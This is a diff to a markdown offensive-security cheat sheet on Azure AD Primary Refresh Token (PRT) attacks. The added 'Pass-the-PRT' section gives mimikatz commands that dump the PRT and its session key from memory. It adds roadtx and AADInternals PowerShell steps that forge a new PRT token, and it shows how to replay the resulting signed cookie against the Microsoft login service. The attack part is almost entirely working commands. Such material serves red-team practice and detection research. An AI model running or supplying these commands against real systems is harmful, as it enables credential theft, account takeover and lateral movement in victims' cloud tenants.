@@ -112,15 +112,30 @@ A Primary Refresh Token (PRT) is a key artifact in the authentication and identi
     ```
 
 
-### Extract PRT v1
+### Extract PRT v1 - Pass-the-PRT
 
-```ps1
-mimikatz # token::elevate
-mimikatz # sekurlsa::cloudap
-mimikatz # sekurlsa::dpapi
-mimikatz # dpapi::cloudapkd /keyvalue:<key-value> /unprotect
-roadtx browserprtauth --prt <prt> --prt-sessionkey <clear-key> --keep-open -url https://portal.azure.com
-```
+MimiKatz (version 2.2.0 and above) can be used to attack (hybrid) Azure AD joined machines for lateral movement attacks via the Primary Refresh Token (PRT) which is used for Azure AD SSO (single sign-on).
+
+* Use mimikatz to extract the PRT and session key
+    ```ps1
+    mimikatz # privilege::debug
+    mimikatz # token::elevate
+    mimikatz # sekurlsa::cloudap
+    mimikatz # sekurlsa::dpapi
+    mimikatz # dpapi::cloudapkd /keyvalue:<key-value> /unprotect
+    ```
+* Use either roadtx or AADInternals to generate a new PRT token
+    ```ps1
+    roadtx browserprtauth --prt <prt> --prt-sessionkey <clear-key> --keep-open -url https://portal.azure.com
+
+    PS> Import-Module C:\Tools\AADInternals\AADInternals.psd1
+    PS AADInternals> $PRT_OF_USER = '...'
+    PS AADInternals> while($PRT_OF_USER.Length % 4) {$PRT_OF_USER += "="}
+    PS AADInternals> $PRT = [text.encoding]::UTF8.GetString([convert]::FromBase64String($PRT_OF_USER))
+    PS AADInternals> $ClearKey = "XXYYZZ..."
+    PS AADInternals> $SKey = [convert]::ToBase64String( [byte[]] ($ClearKey -replace '..', '0x$&,' -split ',' -ne ''))
+    PS AADInternals> New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey -GetNonce
+    ```
 
 
 ### Extract PRT on Device with TPM
@@ -134,6 +149,13 @@ roadtx browserprtauth --prt <prt> --prt-sessionkey <clear-key> --keep-open -url 
 * Use [dirkjanm/ROADtoken](https://github.com/dirkjanm/ROADtoken) or [wotwot563/aad_prt_bof](https://github.com/wotwot563/aad_prt_bof) to initiate a new PRT request.
 * `roadrecon auth --prt-cookie <prt-cookie> --tokens-stdout --debug` or  `roadtx gettoken --prt-cookie <x-ms-refreshtokencredential>`
 * Then browse to [login.microsoftonline.com ](login.microsoftonline.com ) with a cookie `x-ms-RefreshTokenCredential:<output-from-roadrecon>`
+    ```powershell
+    Name: x-ms-RefreshTokenCredential
+    Value: <Signed JWT>
+    HttpOnly: √
+    ```
+
+:warning: Mark the cookie with the flags `HTTPOnly` and `Secure`.
 
 
 ### Request a PRT with Hybrid Device
@@ -231,3 +253,4 @@ $Tokens
 * [Microsoft 365 Developer Program](https://developer.microsoft.com/en-us/microsoft-365/dev-program)
 * [PRT Abuse from Userland with Cobalt Strike - 0xbad53c](https://red.0xbad53c.com/red-team-operations/azure-and-o365/prt-abuse-from-userland-with-cobalt-strike)
 * [Pass-the-PRT attack and detection by Microsoft Defender for … - Derk van der Woude - Jun 9](https://derkvanderwoude.medium.com/pass-the-prt-attack-and-detection-by-microsoft-defender-for-afd7dbe83c94)
+* [Journey to Azure AD PRT: Getting access with pass-the-token and pass-the-cert - AADInternals.com - September 01, 2020](https://aadinternals.com/post/prt/)
